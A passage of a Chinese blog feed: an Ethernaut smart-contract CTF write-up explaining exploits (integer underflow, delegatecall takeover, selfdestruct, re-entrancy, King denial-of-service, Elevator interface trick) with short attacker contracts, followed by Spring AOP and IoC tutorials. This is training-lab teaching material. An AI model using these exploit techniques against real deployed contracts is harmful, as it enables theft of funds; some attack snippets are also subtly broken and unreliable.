plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题涉及到tx.origin与msg.sender的区别：前者表示交易的发送者，后者则表示消息的发送者。</p><p>如果情景是在一个合约下的调用，那么这两者是木有区别的；但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户。</p><p>参考：在remix上部署另一个合约，通过该合约调用实例中的方法改变owner</p><hr><h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><p>任务要求：获取更多的Token<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里可以通过<em>下溢</em> 绕过require检测，因为_value和balance[]都为无符号整数，所以结果会变为2^256-1</p><p>参考：略</p><hr><h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><p>任务要求：获取合约的所有权<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：这题包含了两个合约Delegation和Delegate，Delegation合约实例化了Delegate合约，又在其Fallback函数中使用了delegatecall来调用了delegate合约。</p><blockquote><p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool） 和返回的数据（ bytes memory）。而delegatecall又与call有所不同；通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。这个函数主要是方便我们使用存在其他地方的函数（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p></blockquote><p>解题点：使用delegatecall调用delegate合约的pwn函数。</p><hr><h1 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h1><p>任务要求：让合约的balance大于0</p><p>解题点：<del>MEOW~（不是）</del></p><p>在以太坊中可以强制给一个合约发送以太，无论合约是否拒绝。通过函数selfdestruct来实现。</p><blockquote><p>这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送的资金会无视这一点。</p></blockquote><p>因此我们只需要创建一个合约往合约中存点eth然后调用selfdestruct发送给实例合约就行。</p><hr><h1 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h1><p>任务要求：将合约中的bool值改变</p><p>解题点：输入密码<del>废话</del></p><p>任何数据在区块链上都是透明的！（战术后仰）通过web3中的getStorageAt函数直接获取合约里的状态变量的值</p><blockquote><p><code>web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</code><br>参数1：String 获取存储的地址；参数2：存储的索引位置；参数3：（可选）不使用web3.eth.defaultBlock设置的默认块，而是自定义或预定义的块号；参数4：（可选）可选回调，返回一个错误对象作为第一个参数，结果作为第二个参数<br>Returns ：返回给定位置的值</p><p>选自web3.<a href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat">eth官方文档</a></p></blockquote><hr><h1 id="King"><a href="#King" class="headerlink" title="King"></a>King</h1><p>任务要求：确保王位</p><p>解题点：<code>payable(king).transfer(msg.value);</code></p><p>当新的国王诞生时将会给老国王原来的奖金，那么只要原来的国王不接受直接进行revert，那么就可以永远的占据合约的king</p><p>参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma ...<br><br>contract attack&#123;<br>  constructor (address _addr) public payable&#123;<br>    _addr.call&#123;gas:100000000,value:msg.value&#125;;<br>  &#125;<br>  receive() external payable &#123;<br>    revert();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>任务要求：盗取合约中的所有代币</p><p>解题点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint _amount) public &#123;<br>    if(balances[msg.sender] &gt;= _amount) &#123;<br>      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);<br>      if(result) &#123;<br>        _amount;<br>      &#125;<br>      balances[msg.sender] -= _amount;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>重入的关键：发送完成后才进行了sender的balances更新，所以只需要使其不断进行call.value发送eth，同样使用Fallback函数来实现</p><h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>这个电梯不让你到达顶楼，想办法到达顶楼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该题提供了一个接口，在合约中我们看到接口的isLastFloor函数是用来衡量当前楼层是否是顶楼。所以题解在于如何实现isLastFloor函数。<br>方法中执行了两次isLastFloor函数，在通过条件语句时是取反判定，因此我们可以让函数内部进行取反操作这样就可以在执行两次后得到true值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attack &#123;<br>    Elevator ele;<br>    bool b = true;<br>    function isLastFloor(uint) view public retuens(bool) &#123;<br>        t = !t;<br>        return t;<br>    &#125;<br>    function hk(address _addr) public &#123;<br>        ele = Elevator(_addr);<br>        ele.goTo(1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h1><p>通过转移走合约中的所有余额来完成此关。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = block.timestamp + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(block.timestamp &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>合约导入了ERC20，所以对于代币的转移除了重写的transfer还有transfrom方法，只需要注意transfrom函数还需要额外的操作：approve</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;此文章会记录在Ethernaut上经历的题。&lt;/p&gt;</summary>
    
    
    
    <category term="靶场" scheme="http://lexlady.top/categories/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethernaut" scheme="http://lexlady.top/tags/Ethernaut/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
    <category term="Remix" scheme="http://lexlady.top/tags/Remix/"/>
    
  </entry>
  
  <entry>
    <title>SpringAOP</title>
    <link href="http://lexlady.top/2022/12/26/SpringAOP/"/>
    <id>http://lexlady.top/2022/12/26/SpringAOP/</id>
    <published>2022-12-26T15:53:12.000Z</published>
    <updated>2023-05-23T06:04:38.583Z</updated>
    
    <content type="html"><![CDATA[<p>Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。</p><span id="more"></span><h1 id="Spring-AOP的基本概念"><a href="#Spring-AOP的基本概念" class="headerlink" title="Spring AOP的基本概念"></a>Spring AOP的基本概念</h1><h2 id="AOP的概念"><a href="#AOP的概念" class="headerlink" title="AOP的概念"></a>AOP的概念</h2><p>AOP（Aspect-Oriented Programming）即面向切面编程，相应的就是OOP，面向对象编程。在OOP中，以类作为程序的基本单位，而在AOP中则是以切面作为基本单位。  </p><blockquote><p>在业务处理功能中，通常都有日志记录、事务处理、异常处理等操作，如果是使用OOP可以通过封装或继承的方法实现代码重写来应用到多个业务中，但仍存在同样的代码分散到各个方法中。<br>因此，AOP采取横向抽取机制，将分散在各个方法中的重复代码提取出来，然后在程序编译或运行阶段，再将抽取出来的代码应用到需要执行的地方。  </p></blockquote><p>传统的OOP是无法实现这样的横向抽取机制，因为OOP实现的是父子的纵向重用。但AOP并不是OOP的替代品，而是对OOP的一种补充，进而相辅相成。</p><h2 id="AOP的基本术语"><a href="#AOP的基本术语" class="headerlink" title="AOP的基本术语"></a>AOP的基本术语</h2><ol><li>切面（Aspect）<br>指封装横切到系统功能的类  </li><li>连接点（Joinpoint）<br>指程序运行中的一些时间点（如方法的调用或异常的抛出）  </li><li>切入点（Pointcut）<br>指那些需要处理的连接点，在Spring AOP中，所有的方法执行都是连接点，而切入点是一个描述信息，用来修饰连接点，确定哪些连接点需要被处理。  </li><li>通知（增强处理）<br>由切面添加到特点的连接点（满足切入点规则）的一段代码，</li><li>引入（Introduction）<br>允许在现有的实现类中添加自定义的方法和属性  </li><li>目标对象（Target Object）<br>指所有被通知的对象。</li><li>代理（Proxy）<br>是通知应用到目标对象后，被动态创建的对象</li><li>织入（Weaving）</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Spring AOP是Spring框架体系结构中非常重要的功能模块之一；提供了面向切面编程实现。&lt;/p&gt;</summary>
    
    
    
    <category term="Spring Boot" scheme="http://lexlady.top/categories/Spring-Boot/"/>
    
    
    <category term="教程" scheme="http://lexlady.top/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>SpringIoC</title>
    <link href="http://lexlady.top/2022/12/01/SpringIoC/"/>
    <id>http://lexlady.top/2022/12/01/SpringIoC/</id>
    <published>2022-12-01T13:43:42.000Z</published>
    <updated>2023-05-23T06:04:44.681Z</updated>
    
    <content type="html"><![CDATA[<p>简单的对Spring IoC进行介绍,要求理解控制反转的概念；它是如何消减程序的耦合问题的？</p><span id="more"></span><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>下面从一个生活实例对控制反转进行解释（也称依赖注入(Dependency Injection,DI)，只是执行角度不同，是同一个概念）</p><blockquote><p>如果我们要吃饭，就可以有两种选择：一是自己做；另一种是下馆子。当我们要自己做时，就需要自己准备食材、进行烹饪。而下馆子只需要根据自己的需要让店家提供。<br>控制反转的思想便包含在了上述的例子中：<strong>将执行操作交给Spring容器</strong>。<br>由容器控制对象的创建以及查找并注入依赖的资源，而资源则集中管理，<u>实现资源的可配置和易管理</u>，<em>降低了使用资源双方的依赖程度，松耦合</em></p></blockquote><h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><blockquote><p>在Spring框架中，仅管使用XML配置文件可以很简单地装配Bean，但对于需要配置大量的Bean时，其XML文件会过于庞大，不方便维护。  </p></blockquote><p><strong>因此推荐使用注解(annotation)的方式去装配Bean</strong></p><h2 id="声明Bean的注解"><a href="#声明Bean的注解" class="headerlink" title="声明Bean的注解"></a>声明Bean的注解</h2><ol><li>@Component</li></ol><ul><li>表示一个组件对象(Bean)</li><li>作用于任何层次上</li><li>无明确角色</li><li>一个泛化的概念</li></ul><ol start="2"><li>@Repository</li></ol><ul><li>将数据访问层(Dao)的类标识为Bean</li><li>功能与@Component相同</li></ul><ol start="3"><li>@Service</li></ol><ul><li>标注一个业务逻辑组件类（Service）</li><li>功能与@Component相同</li></ul><ol start="4"><li>@Controller</li></ol><ul><li>用于标注一个控制器组件类（Spring MVC 的Controller）</li><li>功能与@Component相同</li></ul><h2 id="注入Bean的注解"><a href="#注入Bean的注解" class="headerlink" title="注入Bean的注解"></a>注入Bean的注解</h2><ol><li>@Autowired</li></ol><ul><li>可以对类成员变量、方法及构造方法进行标注，完成自动装配的工作</li><li>消除setter getter方法</li></ul><ol start="2"><li>@Resource</li></ol><ul><li>与@Autowired功能一样</li><li>区别：默认是按照名称来装配注入的，只有当找不到与名称匹配的Bean时才会按照类型来装配注入；</li><li>@Recourse的两个属性：<ul><li>name：指定Bean实例名称</li><li>type：指定Bean类型</li></ul></li></ul><ol start="3"><li>@Qualifier</li></ol><ul><li>与@Autowired注解配合使用。当@Autowired需要按照名称来装配注入时，则使用@Qualifier</li></ul><p>Spring IoC容器（ApplicationContext）负责创建和注入Bean。Spring提供使用XML配置、注解、Java配置以及groovy配置实现Bean的创建和注入。</p><h1 id="实例一-（基于注解的依赖注入）"><a href="#实例一-（基于注解的依赖注入）" class="headerlink" title="实例一 （基于注解的依赖注入）"></a>实例一 （基于注解的依赖注入）</h1><blockquote><p>步骤：<br>创建Web应用，导入jar包（Spring4件套、第三方依赖包和spring-aop（用于扫描注解））<br>创建Annotation包<br>在该包下创建DAO层<br>在该包下创建Service层<br>在该包下创建Controller层<br>创建配置类<br>创建测试类</p></blockquote><h3 id="Dao层代码"><a href="#Dao层代码" class="headerlink" title="Dao层代码"></a>Dao层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Repository</span><br><span class="hljs-comment">//等价于@Repository(name = &quot;theDao&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testDao save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Service层代码"><a href="#Service层代码" class="headerlink" title="Service层代码"></a>Service层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Service</span><br><span class="hljs-comment">//相当于@Service(&quot;theService&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theService</span> &#123;<br>    <span class="hljs-meta">@Resource(name = &quot;theDao&quot;)</span><br>    <span class="hljs-comment">//相当于@Autowired，</span><br>    <span class="hljs-keyword">private</span> theDao testDao;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testService save&quot;</span>);<br>        testDao.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Controller层代码"><a href="#Controller层代码" class="headerlink" title="Controller层代码"></a>Controller层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> theService testService;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testService.save();<br>        System.out.println(<span class="hljs-string">&quot;testController save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Configuration</span>  <span class="hljs-comment">//声明当前类是配置类，相当于一个XML文件</span><br><span class="hljs-meta">@ComponentScan(&quot;annotation&quot;)</span>    <span class="hljs-comment">//自动扫描当前包下使用的注解，并注册为Bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Configannotation</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestAnnotation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">AnnotationConfigApplicationContext</span> <span class="hljs-variable">appCon</span> <span class="hljs-operator">=</span> <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(Configannotation.class);<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>appCon.getBean(theController.class);<br>        tc.save();<br>        appCon.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="实例二-（Java配置）"><a href="#实例二-（Java配置）" class="headerlink" title="实例二 （Java配置）"></a>实例二 （Java配置）</h1><p>Java配置是通过@Configuration和@Bean来实现的  </p><blockquote><p>@Configuration声明当前类作为一个配置类<br>@Bean注解在方法上，声明当前方法的返回值为一个Bean</p></blockquote><h3 id="Dao层代码-1"><a href="#Dao层代码-1" class="headerlink" title="Dao层代码"></a>Dao层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theDao</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;testDao save&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Service层代码-1"><a href="#Service层代码-1" class="headerlink" title="Service层代码"></a>Service层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theService</span> &#123;<br>    theDao testDao;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTestDao</span><span class="hljs-params">(theDao testDao)</span>&#123;<br>        <span class="hljs-built_in">this</span>.testDao = testDao;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testDao.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Controller层代码-1"><a href="#Controller层代码-1" class="headerlink" title="Controller层代码"></a>Controller层代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">theController</span> &#123;<br>    <span class="hljs-meta">@Autowired</span><br>    theService testService;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTestService</span><span class="hljs-params">(theService testService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.testService = testService;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>        testService.save();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="配置类-1"><a href="#配置类-1" class="headerlink" title="配置类"></a>配置类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> ;<br><span class="hljs-meta">@Configuration</span>  <span class="hljs-comment">//声明当前类是配置类，相当于一个XML文件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Configannotation</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theDao <span class="hljs-title function_">getTestDao</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theDao</span>();<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theService <span class="hljs-title function_">getTestService</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">theService</span> <span class="hljs-variable">ts</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theService</span>();<br>        ts.setTestDao(getTestDao());<br>        <span class="hljs-keyword">return</span> ts;<br>    &#125;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> theController <span class="hljs-title function_">getTestController</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">theController</span> <span class="hljs-variable">ts</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">theController</span>();<br>        ts.setTestService(getTestService());<br>        <span class="hljs-keyword">return</span> ts;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="测试类-1"><a href="#测试类-1" class="headerlink" title="测试类"></a>测试类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 